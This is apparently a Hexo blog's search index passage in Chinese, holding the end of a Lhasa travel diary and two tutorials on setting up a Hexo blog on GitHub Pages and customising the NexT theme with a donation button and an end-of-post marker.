5布宫的门票真的太抢手，200块的门票听说被黄牛炒到了一千多，在一番折腾排队下，终于被放进这个大宫殿。不过在参观过程中，除了游客对各种精致奢华的惊叹，还有那些朝拜者的认真和虔诚。可以看到一家人把坐在轮椅上的老人从山脚下一级级石阶往上抬，也可以看到七旬的两个老奶奶大概是姐妹吧，相互搀扶一起双手合十，一起磕长头，一起留着长长的辫子。不羡慕这虔诚的信仰，但羡慕这种跨越时间温暖的陪伴。不管你去哪儿，都和你一起。 布宫的一角，红色的墙壁里面是一种高原上的草。惊叹于古人的建筑智慧和手艺。 进入主要的宫殿参观文物前最后能拍照的地方。 同行的一个小妹妹，红墙的映衬下，宛若一只仙女。 出布宫后在山上俯瞰整个拉萨，布宫就是整个拉萨的观景台。 格桑花盛开的山坡，此时山顶上的布宫十分安静。 大昭寺门前磕长头的朝拜者。我是看客，无法理解信仰的力量，但激动于世界上还有这样一群人。 八廓街的一角，蓝天，云朵，建筑，一切都温柔和谐。 八廓街上一家叫南卡的冷饮店。名字很美丽。 一对环绕大昭寺磕长头的姐妹，她们还很小，但我好像看到了在布宫那一对磕头相扶的老奶奶。 阴影里的长椅上坐了一排在转经的老爷爷。朋友调侃道，我那么帅你不拍我，去拍老头子。但是，一排老爷爷排排坐真的很可爱啊。 Day 6早晨七点就坐车去纳木错，七点的拉萨还有些黑，尽管穿了外套街头还是很冷。但天微微亮的时候，拉萨的街头十分美丽。 圣湖就是圣湖，远远的就被迷住了。蓝天，云彩，雪山，清水。天空就像是湖水的倒影。坐在湖边发呆，感觉都很美好。 阳光倾泻而下。此处该有个美丽的仙仙的背影= = 再来一张透明的湖水。 一个仙仙的小姐姐的背影，超美，嘤嘤嘤 湖边一个浅滩，云朵和人群的倒影。 海拔5190米，那拉根山口飘舞的经幡。途中总有那么一抹颜色吸引了你，总有那么一个人惊艳于你。 青藏线上的黄昏。安静，美丽。 The End]]></content>
      <categories>
        <category>Wander</category>
      </categories>
      <tags>
        <tag>Wander</tag>
        <tag>Lahsa</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Next主题配置---打赏功能+文章结束标志]]></title>
    <url>%2F2017%2F08%2F10%2Fblog-donate%2F</url>
    <content type="text"><![CDATA[这次介绍一下next主题下添加打赏功能，以及在每篇文章末尾统一添加“文章结束”标志 ~~~吼吼吼 打赏功能首先在主题配置文件即hexo/themes/next/_config.yml找到version字段，查看自己的next主题的版本，如下图所示，我用的next主题的版本为5.1.2 在网上查了一些添加打赏功能的方法，参照来做的时候，发现了一些问题，可能是由于next主题升级到version5后自身增加了些隐藏的新功能，所以在网上找到的别人的一些方法不太适用，下面的添加文章结束功能也是如此。因此自己尝试设置好后特来分享一哈~ 在主题配置文件找到Reward字段部分，如下图所示，其中reward_comment字段设置你的打赏介绍，wechatpay和alipay分别为你保存微信以及支付宝收款二维码的路径，可以是本地路径，也可以是用图床生成的链接地址。我是把图片放在本地的，即将两个二维码图片放在了next/source/images文件夹下。 此时默认的打赏按钮如下，略丑。。。然后作了小小改动，把打赏按钮变好看一点点 ~~~ 改动方法如下：在hexo\themes\next\layout_macro下找到reward.swig文件，这个文件是关于打赏功能样式设置的。用下面代码覆盖原文件中的代码即可。由于保存的自动生成的微信及支付宝二维码图片的大小不一，且原图略大，所以可以通过设置包裹两幅图片的div元素的宽度和高度（代码两处注解处）来限制图片的大小，使其更加美观。宽度和高度可以依据自己喜欢更改大小。当然也可以自己使用图片处理工具将 12345678910111213141516171819202122232425262728293031&lt;div style=&quot;padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;&quot;&gt; &lt;div&gt;&#123;&#123; theme.reward_comment &#125;&#125;&lt;/div&gt; &lt;button id=&quot;rewardButton&quot; disable=&quot;enable&quot; style=&quot;width: 80px;line-height: 38px;text-align: center;font-weight: bold;color: #fff;border-radius: 5px;margin:0 20px 20px 0;position: relative;overflow: hidden;color: #8c96a0;text-shadow:1px 1px 1px #fff;border:1px solid #dce1e6;box-shadow: 0 1px 2px #fff inset,0 -1px 0 #a8abae inset;background: -webkit-linear-gradient(top,#f2f3f7,#e4e8ec);background: -moz-linear-gradient(top,#f2f3f7,#e4e8ec);background: linear-gradient(top,#f2f3f7,#e4e8ec);&quot; onclick=&quot;var qr = document.getElementById(&apos;QR&apos;); if (qr.style.display === &apos;none&apos;) &#123;qr.style.display=&apos;block&apos;;&#125; else &#123;qr.style.display=&apos;none&apos;&#125;&quot;&gt; 打赏 &lt;/button&gt; &lt;div id=&quot;QR&quot; style=&quot;display: none;&quot;&gt; &#123;% if theme.wechatpay %&#125; &lt;div id=&quot;wechat&quot; style=&quot;display: inline-block;width:150px;height:150px&quot;&gt; &lt;img id=&quot;wechat_qr&quot; src=&quot;&#123;&#123; theme.wechatpay &#125;&#125;&quot; alt=&quot;&#123;&#123; theme.author &#125;&#125; WeChat Pay&quot;/&gt; &lt;p&gt;WeChat Pay&lt;/p&gt; &lt;/div&gt; &#123;% endif %&#125; &#123;% if theme.alipay %&#125; &lt;div id=&quot;alipay&quot; style=&quot;display: inline-block;width:150px;height:150px&quot;&gt; &lt;img id=&quot;alipay_qr&quot; src=&quot;&#123;&#123; theme.alipay &#125;&#125;&quot; alt=&quot;&#123;&#123; theme.author &#125;&#125; Alipay&quot;/&gt; &lt;p&gt;Alipay&lt;/p&gt; &lt;/div&gt; &#123;% endif %&#125; &#123;% if theme.bitcoin %&#125; &lt;div id=&quot;bitcoin&quot; style=&quot;display: inline-block&quot;&gt; &lt;img id=&quot;bitcoin_qr&quot; src=&quot;&#123;&#123; theme.bitcoin &#125;&#125;&quot; alt=&quot;&#123;&#123; theme.author &#125;&#125; Bitcoin&quot;/&gt; &lt;p&gt;Bitcoin&lt;/p&gt; &lt;/div&gt; &#123;% endif %&#125; &lt;/div&gt;&lt;/div&gt; 调整后的效果见下图，是不是稍微不那么丑了一点点呢，红红火火恍恍惚惚~~~~ 文章结束标志本以为这是一个非常简单的小功能，其实的确是一个很简单的功能，但由于参考的人家的做法可能不适于我使用的版本，导致这个小小的问题又折腾了好久T T 在hexo\themes\next\layout_macro文件夹下新建passage-end-tag.swig文件，并添加代码如下： 1&lt;div&gt; &#123;% if not is_index %&#125; &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------本文结束&lt;i class=&quot;fa fa-smile-o&quot;&gt;&lt;/i&gt;感谢您的阅读-------------&lt;/div&gt; &#123;% endif %&#125; &lt;/div&gt; 其中的 &lt;i class=&quot;fa fa-smile-o&quot;&gt;&lt;/i&gt;为FontAwesome图标,可以在其中挑选自己喜欢的图标，我选了一个笑脸，嘻嘻(●’◡’●) 然后打开hexo\themes\next\layout_macro文件夹下的post.swig文件，在 END POST BODY这段注解后添加如下图框框中的代码： 具体代码如下： 12345&#123;% if theme.passage_end_tag.enabled and not is_index %&#125; &lt;div&gt; &#123;% include &apos;passage-end-tag.swig&apos; %&#125; &lt;/div&gt;&#123;% endif %&#125; 再然后，打开主题配置文件hexo/themes/next/_config.yml，在末尾添加如下代码： # 文章末尾添加“本文结束”标记 passage_end_tag: enabled: true 效果如下图所示： 最后，运行下hexo g -d 看下部署到github后的效果吧！ PS:比较坑的一点，我使用的markdownpad，使用Tab缩进打代码块时，在右侧预览区可以正常显示代码块文本，但是 hexo s 在本地浏览器预览后，代码块文本却没有正确完整的显示，有些html标签被解释掉了。好像是Tab缩进可以被markdownpad的解释器正确解释，但是hexo的解释器却没有将其正确解析。后面换了一种打代码块的方式，就可以在浏览器正确显示了，但在markdownpad的预览区却没得到正常显示。即在代码块的最前面和最后面单独一行使用三个反引号 ```。如下图所示。 效果显示如下：]]></content>
      <categories>
        <category>搭建博客</category>
      </categories>
      <tags>
        <tag>Next</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于 Hexo 和 Github 搭建个人博客概述]]></title>
    <url>%2F2017%2F08%2F06%2Fhello-world%2F</url>
    <content type="text"><![CDATA[前言：第一次写博客，小激动~~~分享总结下用hexo+github搭建个人博客的过程，以及过程中遇到的问题。（我用的win10 64位系统） 环境介绍 hexo 根据hexo官网的介绍，hexo是一个快速简洁且高效的博客框架。hexo利用markdown等渲染引擎解析文章，快速生成静态网页。 Hexo是基于node.js的, 在安装它之前需要用到npm安装工具, 这个工具是 node.js 安装包的工具, 所以需要先安装 node.js。 关于hexo搭建博客原理进一步了解-hexo原理浅析。 node.js node.js是运行在服务端的javascript，是一个允许开发人员使用javascript语言编写服务端代码的框架。 npm npm是随同node.js一起安装的包管理工具，能解决node.js代码部署上的很多问题。允许用户从npm服务器下载别人编写的第三方包到本地使用。 允许用户从NPM服务器下载并安装别人编写的命令行程序到本地使用。允许用户将自己编写的包或命令行程序上传到NPM服务器供别人使用。 新版的node.js已经集成了npm，所以下载安装node.js也一并将npm安装好了。 git git是一种非常流行的分布式版本控制系统，它和其他版本控制系统的主要差别在于git只关心文件数据的整体是否发生变化，而大多数版本其他系统只关心文件内容的具体差异。 我们利用git将hexo生成的静态博客页面，部署到github pages上。关于git的更多了解。 github 随着git迅速成为最流行的分布式版本控制系统，github网站上线了。github是一个基于git的代码托管平台，它为开源项目免费提供git存储，无数开源项目开始迁移至GitHub，包括jQuery，PHP，Ruby等等。 github pages 是github提供给用户用来展示个人或者项目主页的静态网页系统。每个用户都可以使用自己的github项目创建，上传静态页面的html文件，github会帮你自动更新你的页面。 搭建步骤1.环境准备（node.js，git，github相关设置） 2.hexo下载安装 3.hexo相关配置 4.hexo与github pages链接 5.发布第一篇博文 6.hexo主题介绍及配置 7.hexo第三方服务集成（disqus评论，百度分享，访客记录等） 环境准备node.js下载安装node.js下载 下载完成后一路默认next即可。利用win+R打开命令窗口，在命令窗口中输入以下命令，可以查看node和npm的版本信息。如果可以正确显示版本信息，说明安装正确，否则检查安装过程，重新安装。 node -v npm -v 结果如下图所示。 git下载安装git下载 下载完成后一路默认next即可。在命令窗口中输入以下命令，可以查看git的版本信息。 git --version 结果如下图所示。 github注册相关若没有注册过github账号，在github官网按照步骤注册成功就好。 注册登录后，在页面右上角+号选择New repository创建新的代码仓库。 在Create a new repository页面下，填写Repository name框框，框框中填写yourname.github.io，其中yourname为Owner框框中的那个名字。再勾选一下Initialize this repository with a README 。 正确创建代码仓库后，需要开启github pages功能。在刚刚新建的代码仓库界面点击Settings，就会打开这个库的设置页面，向下拖动，会看见GitHub Pages，点击Launch Automatic page generator，github 自动创建出一个github pages页面。然后你可以试着访问yourname.github.io这个网址。 hexo下载安装在合适的盘，例如以E盘为例，在E盘根目录下新建hexo文件夹，然后右键点击选中hexo,选择Git Bash Here,在git命令窗口中输入以下命令： $ npm install hexo-cli -g 然后输入 $ npm install hexo --save 建议将hexo以下插件一起安装了 $ npm install hexo-generator-index --save #索引生成器 $ npm install hexo-generator-archive --save #归档生成器 $ npm install hexo-generator-category --save #分类生成器 $ npm install hexo-generator-tag --save #标签生成器 $ npm install hexo-server --save #本地服务 $ npm install hexo-deployer-git --save #hexo通过git发布（必装） $ npm install hexo-renderer-marked@0.2.7--save #渲染器 $ npm install hexo-renderer-stylus@0.3.0 --save #渲染器 (或者可以执行 npm install命令，npm会自动安装部分组件，但自己试了下，用npm命令不能安装全组件，部分组件还需自己手动安装，比如最重要的用于部署功能的组件 hexo-deployer-git 用 npm install命令就没装上。可以在hexo/node_modules文件下查看已经安装了的组件。) 安装完成后可查看下所安装的hexo版本信息。在hexo文件夹下右键进入git bash,输入以下命令: $ hexo -v 若看到类似如图所示版本信息说明hexo安装成功。 hexo相关配置 hexo初始化 -&gt;在hexo文件夹下右键进入git bash,输入以下初始化命令： $ hexo init hexo生成 -&gt;输入以下命令生成静态页面: $ hexo g 本地服务 -&gt;输入以下命令建立本地hexo预览： $ hexo s(确保已经安装了hexo-server组件，否则该命令无效） 执行完 hexo s 命令后会提示 INFO Hexo is running at http://0.0.0.0:4000/. Press Ctrl+C to stop. 在浏览器中打开上述链接地址，会看到hexo默认的主题页面，至此hexo本地配置完成。 PS：注意！！！安装了福昕阅读器的朋友，福昕阅读器会占用4000端口，导致 hexo s 命令后出错提示4000端口被占用。你可以在hexo/_config.yml站点配置文件里修改端口号，换成自己想设置的端口即可，如下修改： server: port: 4001 compress: true header: true hexo与github pages链接 deployment配置 -&gt;在hexo/_config.yml站点配置文件里，修改下面的字段内容如下： deploy: type: git repo: https://github.com/yourname/yourname.github.com.git #yourname即为创建仓库时的那个yourname branch: master PS:注意.yml格式文件冒号后面有一个空格。 发布第一篇博文在hexo文件夹下右键进入git bash,输入以下命令即可生成一篇新文章： hexo new post &quot;post_title&quot; #其中post_title为你想新建文章的文件名 此时在 E:\hexo\source\ _posts 下生成一个 post_title.md 文件（此后你可以用markdown编辑器打开该.md文件就可以编辑文章了）。 然后运行下面两条命令即可将新建的文章生成-&gt;部署到github上。 hexo g #生成 hexo d #部署 部署完毕后，即可访问https://yourname.github.io看到刚刚生成部署到github的文章。 PS：以后每次用markdown编辑器修改post_title.md文件后，记得用 hexo g -d 命令来生成和部署。修改完配置后也要hexo g -d一下。 PPS:hexo常用命令 hexo new post &quot;postName&quot; #新建文章 hexo new page &quot;pageName&quot; #新建页面 hexo generate #生成静态页面至public目录 hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server） hexo deploy #将.deploy目录部署到GitHub hexo help #查看帮助 hexo version #查看Hexo的版本 简写 hexo n == hexo new hexo g == hexo generate hexo s == hexo server hexo d == hexo deploy hexo主题介绍及配置我选用的较为简洁大方的next主题。 next主题下载 -&gt;在hexo文件夹下右键进入git bash,输入以下命令： git clone https://github.com/iissnan/hexo-theme-next themes/next 启用next主题 -&gt;在hexo/_config.yml站点配置文件下，修改如下字段： theme: next 测试主题启用是否成功 -&gt;执行 hexo s命令，在浏览器访问 http://localhost:4000查看主题效果。 PS：主题的其他相关设置可以参考该博客，写的很详细手把手教你用Hexo+Github 搭建属于自己的博客。 hexo第三方服务集成添加disqus评论由于以前国内使用较多的多说评论下架了，所以选用了国外较为稳定的disqus，但使用该评论功能需要“科学上网”！ 注册disqus账号https://disqus.com 在disqus设置页面中点 Add Disqus to your site 添加你的网站地址(即为https://yourname.github.io), 和设置Choose your unique Disqus URL, 你所填写的unique Disqus URL即为hexo配置文件中需要修改的short_name字段。 打开hexo/themes/next/_config.yml主题配置文件，修改下面字段： #Disqus disqus: enable: true shortname: #shortname即为你上面填写的唯一disqus路径，填上就好 count: true 添加百度分享功能百度分享功能的添加可以参考下面这篇博客。Hexo+Github搭建个人博客(三)——百度分享集成 百度统计访客访问量功能其他酷炫小功能参考hexo的next主题个性化教程:打造炫酷网站。 参考博客手把手教你用Hexo+Github 搭建属于自己的博客 记录第一次搭建hexo 嘤嘤嘤~~~THE END!]]></content>
      <categories>
        <category>搭建博客</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Git</tag>
        <tag>Node.js</tag>
        <tag>Npm</tag>
        <tag>Github</tag>
      </tags>
  </entry>
</search>
